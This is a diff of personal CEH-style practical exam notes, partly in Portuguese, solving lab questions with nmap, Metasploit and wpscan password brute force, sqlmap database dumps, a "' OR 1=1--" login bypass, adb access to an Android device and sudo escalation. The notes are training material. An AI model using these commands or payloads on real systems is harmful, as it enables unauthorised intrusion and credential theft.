@@ -1,81 +1,95 @@
-Q1 - After discovering that a website hosted in a server was vulnerable to blind SQLi attacks during a security assessment, 
-	it was determined that the database mangement system undelying the site was mysql. 
+﻿Q1 - After discovering that a website hosted in a server was vulnerable to blind SQLi attacks during a security assessment, 
+	it was determined that the database management system underlying the site was mysql. 
 	Can you identify the operating system on the machine hosting the database?
 
 	nmap -sV <IP>/24
 	nmap -A <IP>/24
 	
-	now taht we know which ip machine has 3306 port open
+	now that we know which ip machine has 3306 port open
 	
-		nmap -O <IP>
+	nmap -O <IP>
 	
 
 Q2 - In a organization's network security assessment, a peculiar user account was discovered to have been added to a machine with the ip 192.168.1.10. 
-	The following accounts were found to be secure. JohnDoe, SarahConnor, Neo, Oracle and Sherlock. What is the user name of the suspicious account. 
+	The following accounts were found to be secure. John Doe, Sarah Connor, Neo, Oracle and Sherlock. What is the user name of the suspicious account. 
 	Please provide the username only and exclude the domain name.
-	Please Note: Username - JohnDoe; Password - sunshine789
+	Please Note: Username – John Doe; Password - sunshine789
 
 		Use RDP to login
 		Open cmd and use 
-			net user 
-		command to find out the username of the suspicious account
+		net user (command to find out the username of the suspicious account)
 		
-Q3 - Find de ip address of the machine with RDP port open
-		see Q1
-			or
-		nmap -Pn -sV -P 3389 <IP>
+Q3 - Find de IP address of the machine with RDP port open
+		
+see Q1
+or
+nmap -Pn -sV -P 3389 <IP>
 
-Q4 - The eth1 machine has a file called Cry-DES(ECB)-TFP-IP.hex, containing encrypted credentials to coonect to an FTP server. The file's encryption
-	algorithm is DES(ECB). To procced, the file needs to be decrypted to obtain the FTP credentials. Afterward, use th FRP login credentials, "Hacker" as the user name, to connect to the FTP server
-	and retrieve the file named of "flaf1.txt". Can toy decrypt the file and provide the contents of "flag1.txt" as the answer?
+Q4 - The eth1 machine has a file called Cry-DES(ECB)-TFP-IP.hex, containing encrypted credentials to connect to an FTP server. The file's encryption algorithm is DES(ECB). To procced, the file needs to be decrypted to obtain the FTP credentials. Afterward, use the FRP login credentials, "Hacker" as the user name, to connect to the FTP server
+and retrieve the file named of "flag1.txt". Can you decrypt the file and provide the contents of "flag1.txt" as the answer?
 
-	Decrypt with Cryptool
-		Encrypt(Decrypt
-			Symmetric
-				DES (ECB)
+Decrypt with Cryptool
+
+Encrypt (Decrypt)
+
+	 Symmetric
+		DES (ECB)
 				
 	Then
 		cmd
-		ftp <IP>
+	
+	ftp <IP>
 			get file flag1.txt
 			
 Q5 - It has been discovered that an employee stole critical bank credentials and concealed them in a file called "Secret-Accounts.txt".
-	using steganography. The file is the H1 machine. Your task is to decioher the concelead information in the file an locate de account nember.
-	The file is stored in c:\users\... and the passwod is "magic". 
+using steganography. The file is the H1 machine. Your task is to decipher the concealed information in the file an locate de account number.
+The file is stored in c:\users\... and the password is "magic". 
 	
-		As we ate trying to get information from a .txt file we use snow
-			snow -C -p "magic" secret.accounts.txt
+As we ate trying to get information from a .txt file we use snow
+
+snow -C -p "magic" secret.accounts.txt
 			
 Q6 - You are working as an ethical hacker fro an organizarion and one of the emplyees, sarah, has reported being locked out of her wordpress
-	account at http://192.168.1.10:8080/CEH, She suspects foul play and has ascked for your help in reterieving he account password from the Wordpress
-	database. Your task is to identify the password associated with the user ID "Sarah" and resolve the issue to allow her
-	to access her account again.
+account at http://192.168.1.10:8080/CEH, She suspects foul play and has ascked for your help in reterieving he account password from the Wordpress database. Your task is to identify the password associated with the user ID "Sarah" and resolve the issue to allow her
+to access her account again.
 	
-		wpscan --url http://192.168.1.10:8080/CEH -u Sarah -P passwdlist.txt
 		
-		or
+wpscan --url http://192.168.1.10:8080/CEH -u Sarah -P passwdlist.txt
 		
-		msfconsole
-			use auxiliary/scanner/http/wordpress_logi_enum
-			show options
-			set PASS_FILE /home/attacker/Desktop/Worldist/passwlist.txt
-			set RHOSTS 191.168.1.10 (TARGET ip)
-			SET RPORT 8080
-			set TARGETURI http://192.168.1.10:8080/
-			set username Sarah
+		
+or
+		
+		
+msfconsole
 			
+use auxiliary/scanner/http/wordpress_logi_enum
+			
+show options
+			
+set PASS_FILE /home/attacker/Desktop/Worldist/passwlist.txt
+			
+set RHOSTS 191.168.1.10 (TARGET ip)
+			
+SET RPORT 8080
+			
+set TARGETURI http://192.168.1.10:8080/
+			
+set username Sarah
+			
+
 Q7 - A file called "Secrethash.txt" has been uploaded via DVWA at hhtp://192.168.1.10/DVWA, The file is located at the following path:
-	C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt. Your task is to crack the MD5 hash present in the file and reveal the original
-	message. You can access the file by logging into DVWA using the provided credential.
+C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt. Your task is to crack the MD5 hash present in the file and reveal the original
+message. You can access the file by logging into DVWA using the provided credential.
 	
 		Username: "superuser" and Password: "superman"
 		
-		Hint. You can decrypt the hash using the following link http://hashes.com/en/decrypt/hash
+Hint. You can decrypt the hash using the following link 
+http://hashes.com/en/decrypt/hash
 		
 		
 Q8 - As an ethical hacker working for a company, you have been tasked with retriving a critical file named secret.txt that has been
-	concealed in the server 2019 machine. the file is located in c:\users\dell\documents\confidential. You will need to use a
-	a backdoor installed in the server to acces the file.Your objective is to find the secret number hidden inside the file and provide it.
+concealed in the server 2019 machine. the file is located in c:\users\dell\documents\confidential. You will need to use a
+a backdoor installed in the server to acces the file.Your objective is to find the secret number hidden inside the file and provide it.
 	
 		1. Use credential of RDP found in Q2 to login
 		2. Browse to the mentioned path
@@ -104,13 +118,13 @@ Q10 - If the question is to identify the number os machines involved in the atta
 			Look in the end the user and pass	
 			
 Q11 - An FTF site is hosted on a machine in a network. Crack the ftp content credential to obtain the file "flag.txt" available on the server
-	and enter the content in the file as the answer.
+and enter the content in the file as the answer.
 	
 	First identify the machine with port 21 open
 	Use Hydra with the user and password lists provided
 	
 Q12 - get a file that is in the desktop computer of John. John approached you to remotley access his workplace computer and provide the document
-	number that starts with "F/XXXXXXX". The computer name is "Server20219" and the login credentials are John and passwd is secure123.
+number that starts with "F/XXXXXXX". The computer name is "Server20219" and the login credentials are John and passwd is secure123.
 	
 		Here the hint is "remotley access the john computer" and is a windows server machine:
 	
@@ -118,47 +132,54 @@ Q12 - get a file that is in the desktop computer of John. John approached you to
 		Simply use RDP login
 		View the file in the desktop
 		
-Q13 - You are Cathie, an ethical hacker working for a movie production house. While testing the website "www.moviescope.com" for vulnerabilities,
-	you came across an SQLi vulnerability. The cookie information is stored in a text file in the documents folder of the ethical hacler-2 machine.
-	Use the SQL DSSS attack method to capture de session link. Determine the contact number of Kety associated with the website.
+Q13 - You are Cathie, an ethical hacker working for a movie production house. While testing the website "www.moviescope.com" for vulnerabilities, you came across an SQLi vulnerability. The cookie information is stored in a text file in the documents folder of the ethical hacler-2 machine.
+Use the SQL DSSS attack method to capture de session link. Determine the contact number of Key associated with the website.
 
 
-	How to see the phone number of a given username in  http://moviescope.com
+How to see the phone number of a given username in  http://moviescope.com
 
-	We can try sqlmap SQL DSSS - stands is a technique that stands for: 
-					  Stealth, Speed and Succes
+We can try sqlmap SQL DSSS - stands is a technique that stands for:  Stealth, Speed and Succes
 
-	Standard use
-# Basic database dump with optimization	sqlmap -u "http://example.com/vuln.php?id=1" --dbs --batch
+Standard use
+# Basic database dump with optimization
 
-	# Dump specific database
-	sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --dump
+sqlmap -u "http://example.com/vuln.php?id=1" --dbs --batch
 
-	# Dump all databases
-	sqlmap -u "http://example.com/vuln.php?id=1" --dump-all
+	
+# Dump specific database
+	
+sqlmap -u "http://example.com/vuln.php?id=1" -D database_name --dump
+
+	
+# Dump all databases
+	
+sqlmap -u "http://example.com/vuln.php?id=1" --dump-all
 	
 	
-	With advanced DSSS Techniques - See doc "SQLmap with DSSS techniques"
 	
-	# Fast extraction (use with caution)
-	sqlmap -u "http://example.com/vuln.php?id=1" --threads=10 --batch --dump --optimize
+With advanced DSSS Techniques - See doc "SQLmap with DSSS techniques"
+	
+	
+# Fast extraction (use with caution)
+	
+sqlmap -u "http://example.com/vuln.php?id=1" --threads=10 --batch --dump --optimize
 	
 	or
 					  
-	Na página de login
-		1. user' OR 1=1--
-		2 Password - any
+	
+Na página de login
+		
+1. user' OR 1=1--
+		
+2 Password - any
 		
 		
-	No endereço
-		2. ir mudando o id do user =1, =2
-			até encontrar o user pretendido e a informação pedida (ID, email, phone number...
+No endereço
+2. ir mudando o id do user =1, =2
 
-Q14 - As part of hos job, Rave, a network security specialist, was tasked with analysing a packet capture file 
-	called Dos.pcapng, which was stored in the documents folder of the ethical hacker-1 machine. He was instructed to determine is any
-	user credentials associated eith the sebsite. www.industry.com were recorded in plain text format. After examining the file, Raven dicovered that the site traffic 
-	was trasnversing in plain text and found a username and password recorded in on of the packets. Please provide the
-	the credentials found in the capture file in the following format: usename/password
+até encontrar o user pretendido e a informação pedida (ID, email, phone number...
+
+Q14 - As part of hos job, Rave, a network security specialist, was tasked with analysing a packet capture file called Dos.pcapng, which was stored in the documents folder of the ethical hacker-1 machine. He was instructed to determine is any user credentials associated eith the sebsite. www.industry.com were recorded in plain text format. After examining the file, Raven dicovered that the site traffic was trasnversing in plain text and found a username and password recorded in on of the packets. Please provide the the credentials found in the capture file in the following format: usename/password
 
 	.Pcac file for login credentials - username and password
 		Open the pcap file and in the filter write: http.request.method == POST
@@ -167,47 +188,45 @@ Q14 - As part of hos job, Rave, a network security specialist, was tasked with a
 Q15 - On identifying the HTTP method in the website www.moviescope.com, that poses the highest risk to the website,
 you decide to use the OWASP ZAP tool.
 
-	Pergunta qual o método de SQLi - GET, POST, PUT...
-		Usamos o OWASP-ZAP
-			Automatic Scan ao URL www.moviescope.com
+Pergunta qual o método de SQLi - GET, POST, PUT...
+Usamos o OWASP-ZAP
+		Automatic Scan ao URL www.moviescope.com
 			
-				Vamos ao alerts
-					SQLi
-						Tipo de attack - como usamos a '1 OR 1=1--
-							Será POST.
+Vamos ao alerts SQLi
+Tipo de attack - como usamos a '1 OR 1=1--
+Será POST.
 							
 Q16 - Identify the number of hosts that are alive in a given subnet
 
-	namp -sn 192.168.56.0/24
+namp -sn 192.168.56.0/24
 
-Q17 - An employee as stolen secrets and encrypted them using veracrypt. You task is to decrypt the file using the password "test" and identify the secret 
-	code contained in it:
+Q17 - An employee as stolen secrets and encrypted them using veracrypt. You task is to decrypt the file using the password "test" and identify the secret code contained in it:
 	
-	Use veracrypt to mount the volume and access to it to find the secret
+Use veracrypt to mount the volume and access to it to find the secret
 	
 
-Q18 - As an ethicak hacker working with a bank, yout task is to decrypt a cipher named "Cry-RC4-Accountno.hex" sotredin the documents
-	folde of the machine1. The file eas encrypted by an attacker who stole a customer's account number from the banks' 
-	database using CrypTool. Your goal is to determine the account number by decrypting the filem with the hint 
-	to use "14" as the key-value under the key lenght.
+Q18 - As an ethical hacker working with a bank, your task is to decrypt a cipher named "Cry-RC4-Accountno.hex" stored in the documents
+folder of the machine1. The file was encrypted by an attacker who stole a customer's account number from the banks' database using CrypTool. Your goal is to determine the account number by decrypting the file with the hint to use "14" as the key-value under the key length.
 	
-	Cryptool
-		Encrypt/Decrypt
-			Dymmetric
+Cryptool
+	Encrypt/Decrypt
+			Symmetric
 				RC4
 					Key
 						14
 							Decrypt
-Q19 - Android
+
+Q19 – Android
+
 		adb connect <IP>:5555
 		adb shell
 		find /sdcard -name "secret.txt"
 		pwd --> ls --> cd sdcard --> ls --> cat secret.txt
+
 	
-Q20 - A vicious attacker has encoded the ip address of the target machine. Your task is to decode the file and extract
-	the Ip address of the compromised machine. Password: shadow123
+Q20 - A vicious attacker has encoded the ip address of the target machine. Your task is to decode the file and extract the Ip address of the compromised machine. Password: shadow123
 	
-		Use BCTextEncoder
+Use BCTextEncoder
 		
 
 
@@ -227,11 +246,12 @@ Find the fqdn of a domain controller in a subnet
 			
 	Lets say the result was:
 
-		port		state		service		version
-		389/TCP		open		ldap		Microsoft Active Directory LDAP (Domain: pentester.team., Site: default-...
-		Service Info: Host: DC, OS: Windows; CPE; cpe:/o:microsoft windows
+port		state		service		version
+389/TCP		open		ldap		Microsoft Active Directory LDAP (Domain: pentester.team., Site: default-... 
+
+Service Info: Host: DC, OS: Windows; CPE; cpe:/o:microsoft windows
 		
-	FQDN - DC.penetester.team
+FQDN - DC.penetester.team
 
 
 Hacking Wireless Networks
@@ -243,14 +263,9 @@ Hacking Wireless Networks
 		aircrack-ng -a2 -b <target BSSID> -w <password list.txt> <WP2 PCAP file>
 		
 	
-An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. Yiu are assigned to 
-covertly access the users device to obtain
-
-		Malicious elf files stored in a folder "scan"
-		Perform deel scan on the elf files to obtain de last 4 digits of the SHA384 hash file of the file with the highest
-		entropy value
+An insider attack has been identified in one of the employees mobile device in 192.168.0.0/24 subnet. Yiu are assigned to covertly access the users device to obtain Malicious elf files stored in a folder "scan" Perform deep scan on the elf files to obtain de last 4 digits of the SHA384 hash file of the file with the highest entropy value
 		
-		We already connect with adb to the target - in port 5555
+We already connect with adb to the target - in port 5555
 		
 			adb connect 192.168.56.12:5555
 			adb shell
@@ -261,12 +276,9 @@ covertly access the users device to obtain
 				file3.elf
 				file3.elf
 				
-			first we need to move this folder to our machine
-				we copy the path were the files are /sdcard/scan
+first we need to move this folder to our machine we copy the path were the files are /sdcard/scan
 			
-			adb pull /sdcard/scan dd/			dd/ is get root permissions
-			
-			a scan folder id created in our machine with the .elf files
+adb pull /sdcard/scan dd/			dd/ is get root permissions a scan folder id created in our machine with the .elf files
 			
 			cd scan
 				ls
@@ -274,18 +286,18 @@ covertly access the users device to obtain
 				file3.elf
 				file3.elf
 	
-		Now we need to calculate de entropy and see which of the files has the highest entropy value
-				ent file1.txt			
+Now we need to calculate de entropy and see which of the files has the highest entropy value
+
+			ent file1.txt	
+		
 		 	ent file2.txt
 			
 			ent file3.txt
 			
-		With this tool we get different Entropy values
+With this tool we get different Entropy values
 
-		Now that we have the file with the hig entropy (lets say is file1.txt),
-			sha384sum file1.txt
-			
-			it generates a hash:
+Now that we have the file with the hig entropy (lets say is file1.txt),
+sha384sum file1.txt it generates a hash:
 			fsdflklkjlksljkjflksdfljlskdjflksdjflskdklkfjslkdjfslkdfdffdfddfe344543ef
 			
 		so to answer the question, the last four digits are: 43ef
@@ -294,22 +306,21 @@ covertly access the users device to obtain
 Priviledge Escalation
 Example:
 
-Q1 - You used shoulder surfing to identify the username and password of a user on the Ubuntu machine in the 192.168.0.0/24 network that is kali and pass@123. Access the target machine , 
-perform vertical escalation to that of a root user and enter the content of the imroot.txt file as the answer.
+Q1 - You used shoulder surfing to identify the username and password of a user on the Ubuntu machine in the 192.168.0.0/24 network that is kali and pass@123. Access the target machine, perform vertical escalation to that of a root user and enter the content of the imroot.txt file as the answer.
 
 	nmap -sV -p 22 192.168.0.0/24
 	
-	after we identify the ip with port 22 open and running linux, we enter with
+after we identify the ip with port 22 open and running linux, we enter with
 	
 		ssh kali@192.168.0.1
 		
 		use the given password pass@123
 		
-			Now that we are in lets see what we can do if we were sudo
+		Now that we are in let’s see what we can do if we were sudo
 			
 			sudo -l
 			
-			Lets try to get root
+			Let’s try to get root
 			
 			sudo -i
 			
@@ -319,22 +330,22 @@ perform vertical escalation to that of a root user and enter the content of the 
 			
 			root
 			
-			Great, let find the file...
+			Great, let’s find the file...
 			
 				find . -name imroot.txt
 
 CVE and CVSS
 
-Q - Perform a vulnerability scan for the host with ip address 192.168.56.21. What is the severity score of a vulnerability tha indicates
- the EOL od a web development language platform?
+Q - Perform a vulnerability scan for the host with ip address 192.168.56.21. What is the severity score of a vulnerability that indicates the EOL od a web development language platform?
  
 	nmap -Pn --script vuln 192.168.56.21
 	
-	In the found CVE's look for one that mentions EOL, out of date... If not copy the CVE and look on google.
+In the found CVE's look for one that mentions EOL, out of date... If not copy the CVE and look on google.
 	
-	Then in the NVD database look for the CVSS.
+Then in the NVD database look for the CVSS.
 	
 	
+
 SUMMARY
 
 Enumeration & Reconnaissance
@@ -620,6 +631,8 @@ Wireshark → Filter mqtt
 Check line 49 or 201
 
 Topics: Fleet_Count, Data Bre@ch @lert
+
+
 
 
 
